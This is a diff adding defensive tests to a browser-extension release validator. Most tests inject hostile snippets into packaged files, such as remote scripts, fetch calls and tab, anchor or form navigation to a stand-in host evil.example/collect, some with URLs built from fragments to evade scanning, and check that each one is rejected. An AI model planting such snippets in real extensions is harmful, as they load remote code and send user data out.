@@ -75,6 +75,8 @@ describe('ExtensionReleaseArtifact CONTRACT v1.0.0', () => {
     expect(report.manifest.manifest_version).toBe(3);
     expect(report.manifest.background?.service_worker).toBe('background.js');
     expect(report.manifest.action?.default_popup).toBe('popup.html');
+    expect(report.manifest.content_security_policy?.extension_pages)
+      .toBe("default-src 'self'; script-src 'self'; object-src 'none'; connect-src 'none'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none';");
     expect(report.files).toContain('icons/icon128.png');
     expect(report.files).toContain('popup.css');
 
@@ -138,6 +140,236 @@ describe('ExtensionReleaseArtifact CONTRACT v1.0.0', () => {
     await writeFile(popupBundlePath, popupBundle);
   });
 
+  it('rejects syntax-invalid JavaScript bundles', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(popupBundlePath, `${popupBundle}\nfunction broken( {\n`);
+
+    await expect(validateDist(distDir)).rejects.toThrow(/invalid JavaScript syntax/i);
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('rejects remote executable references in popup HTML', async () => {
+    const popupPath = path.join(distDir, 'popup.html');
+    const originalPopup = await readFile(popupPath, 'utf8');
+    await writeFile(
+      popupPath,
+      originalPopup.replace('</body>', '<script src="https://evil.example/remote.js"></script></body>'),
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/remote (?:executable|resource) reference/i);
+    await writeFile(popupPath, originalPopup);
+  });
+
+  it('rejects unquoted remote executable references in popup HTML', async () => {
+    const popupPath = path.join(distDir, 'popup.html');
+    const originalPopup = await readFile(popupPath, 'utf8');
+    await writeFile(
+      popupPath,
+      originalPopup.replace('</body>', '<script src=https://evil.example/remote.js></script></body>'),
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/remote (?:executable|resource) reference/i);
+    await writeFile(popupPath, originalPopup);
+  });
+
+  it('rejects meta-refresh navigation in popup HTML', async () => {
+    const popupPath = path.join(distDir, 'popup.html');
+    const originalPopup = await readFile(popupPath, 'utf8');
+    await writeFile(
+      popupPath,
+      originalPopup.replace('</head>', '<meta http-equiv="refresh" content="0; url=https://evil.example/collect"></head>'),
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/meta refresh navigation/i);
+    await writeFile(popupPath, originalPopup);
+  });
+
+  it('rejects remote image and stylesheet references in popup HTML', async () => {
+    const popupPath = path.join(distDir, 'popup.html');
+    const originalPopup = await readFile(popupPath, 'utf8');
+    await writeFile(
+      popupPath,
+      originalPopup.replace('</body>', '<img src="https://evil.example/track.png"></body>'),
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/remote resource reference/i);
+    await writeFile(popupPath, originalPopup);
+  });
+
+  it('rejects remote resources imported through packaged CSS', async () => {
+    const stylesheetPath = path.join(distDir, 'popup.css');
+    const originalStylesheet = await readFile(stylesheetPath, 'utf8');
+    await writeFile(
+      stylesheetPath,
+      `${originalStylesheet}\n.remote { background: url(https://evil.example/pixel.png); }`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/remote resource reference/i);
+    await writeFile(stylesheetPath, originalStylesheet);
+  });
+
+  it('rejects network and dynamic-code capabilities in packaged bundles', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(popupBundlePath, `${popupBundle}\nfetch('https://evil.example/payload');\n`);
+
+    await expect(validateDist(distDir)).rejects.toThrow(/forbidden fetch capability/i);
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('rejects external navigation or exfiltration URLs embedded in a bundle', async () => {
+    const backgroundBundlePath = path.join(distDir, 'background.js');
+    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
+    await writeFile(
+      backgroundBundlePath,
+      `${backgroundBundle}\nchrome.tabs.create({ url: 'https://evil.example/collect?d=proof' });\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/forbidden (?:external URL|browser navigation capability)/i);
+    await writeFile(backgroundBundlePath, backgroundBundle);
+  });
+
+  it('rejects browser navigation even when an external URL is assembled dynamically', async () => {
+    const backgroundBundlePath = path.join(distDir, 'background.js');
+    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
+    await writeFile(
+      backgroundBundlePath,
+      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; chrome.tabs.create({ url: destination });\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(backgroundBundlePath, backgroundBundle);
+  });
+
+  it('rejects aliased tab navigation with a dynamically assembled URL', async () => {
+    const backgroundBundlePath = path.join(distDir, 'background.js');
+    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
+    await writeFile(
+      backgroundBundlePath,
+      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; const tabApi = chrome.tabs; tabApi.create({ url: destination });\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(backgroundBundlePath, backgroundBundle);
+  });
+
+  it('rejects global open navigation with a dynamically assembled URL', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(
+      popupBundlePath,
+      `${popupBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; globalThis.open(destination);\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('rejects destructured Chrome tab navigation', async () => {
+    const backgroundBundlePath = path.join(distDir, 'background.js');
+    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
+    await writeFile(
+      backgroundBundlePath,
+      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; const { tabs } = chrome; tabs.update(1, { url: destination });\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(backgroundBundlePath, backgroundBundle);
+  });
+
+  it('rejects navigation through an aliased Chrome root', async () => {
+    const backgroundBundlePath = path.join(distDir, 'background.js');
+    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
+    await writeFile(
+      backgroundBundlePath,
+      `${backgroundBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; const browserApi = chrome; browserApi.tabs.update(1, { url: destination });\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(backgroundBundlePath, backgroundBundle);
+  });
+
+  it('rejects location method navigation', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(
+      popupBundlePath,
+      `${popupBundle}\nconst scheme = 'ht'; const destination = scheme + 'tps://evil.example/collect'; location.assign(destination);\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('allows an unrelated object method named fetch', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(
+      popupBundlePath,
+      `${popupBundle}\nconst localCache = { fetch() { return 'local'; } }; localCache.fetch();\n`,
+    );
+
+    await expect(validateDist(distDir)).resolves.toBeTruthy();
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('rejects an uninstall URL assembled at runtime', async () => {
+    const backgroundBundlePath = path.join(distDir, 'background.js');
+    const backgroundBundle = await readFile(backgroundBundlePath, 'utf8');
+    await writeFile(
+      backgroundBundlePath,
+      `${backgroundBundle}\nconst scheme = 'ht'; chrome.runtime.setUninstallURL(scheme + 'tps://evil.example/collect');\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/browser navigation capability/i);
+    await writeFile(backgroundBundlePath, backgroundBundle);
+  });
+
+  it('rejects dynamically targeted anchor navigation', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(
+      popupBundlePath,
+      `${popupBundle}\nconst scheme = 'ht'; const anchor = document.createElement('a'); anchor.href = scheme + 'tps://evil.example/collect'; anchor.click();\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/(?:DOM|location) navigation capability/i);
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('rejects dynamically targeted form navigation', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(
+      popupBundlePath,
+      `${popupBundle}\nconst scheme = 'ht'; const form = document.createElement('form'); form.action = scheme + 'tps://evil.example/collect'; form.submit();\n`,
+    );
+
+    await expect(validateDist(distDir)).rejects.toThrow(/(?:DOM|location) navigation capability/i);
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('does not mistake inert string content for a network call', async () => {
+    const popupBundlePath = path.join(distDir, 'popup.js');
+    const popupBundle = await readFile(popupBundlePath, 'utf8');
+    await writeFile(popupBundlePath, `${popupBundle}\nconst inertDocumentation = 'fetch(';\n`);
+
+    await expect(validateDist(distDir)).resolves.toBeTruthy();
+    await writeFile(popupBundlePath, popupBundle);
+  });
+
+  it('rejects a relaxed extension-page CSP', async () => {
+    const manifestPath = path.join(distDir, 'manifest.json');
+    const originalManifest = await readFile(manifestPath, 'utf8');
+    const relaxedManifest = JSON.parse(originalManifest);
+    relaxedManifest.content_security_policy.extension_pages = "script-src 'self'; object-src 'self'";
+    await writeFile(manifestPath, JSON.stringify(relaxedManifest));
+
+    await expect(validateDist(distDir)).rejects.toThrow(/content_security_policy/i);
+    await writeFile(manifestPath, originalManifest);
+  });
+
   it('rejects a ZIP whose contents no longer match validated dist', async () => {
     await packageExtension({ distDir, zipPath });
     await writeFile(path.join(distDir, 'popup.css'), '/* changed after packaging */');
@@ -155,6 +387,29 @@ describe('ExtensionReleaseArtifact CONTRACT v1.0.0', () => {
     await writeFile(manifestPath, JSON.stringify(unsafeManifest));
 
     await expect(validateDist(distDir)).rejects.toThrow(/reopen-tab|Ctrl\+Shift\+Y/i);
+    await writeFile(manifestPath, originalManifest);
+  });
+
+  it('rejects manifest privilege expansion beyond the published privacy contract', async () => {
+    const manifestPath = path.join(distDir, 'manifest.json');
+    const originalManifest = await readFile(manifestPath, 'utf8');
+    const overPrivilegedManifest = JSON.parse(originalManifest);
+    overPrivilegedManifest.host_permissions = ['<all_urls>'];
+    await writeFile(manifestPath, JSON.stringify(overPrivilegedManifest));
+
+    await expect(validateDist(distDir)).rejects.toThrow(/host_permissions|permissions/i);
+    await writeFile(manifestPath, originalManifest);
+  });
+
+  it('rejects optional privileges and additional commands', async () => {
+    const manifestPath = path.join(distDir, 'manifest.json');
+    const originalManifest = await readFile(manifestPath, 'utf8');
+    const expandedManifest = JSON.parse(originalManifest);
+    expandedManifest.optional_permissions = ['history', 'bookmarks'];
+    expandedManifest.commands.nuke_tabs = { description: 'Surprise' };
+    await writeFile(manifestPath, JSON.stringify(expandedManifest));
+
+    await expect(validateDist(distDir)).rejects.toThrow(/manifest keys|commands|optional_permissions/i);
     await writeFile(manifestPath, originalManifest);
   });
 
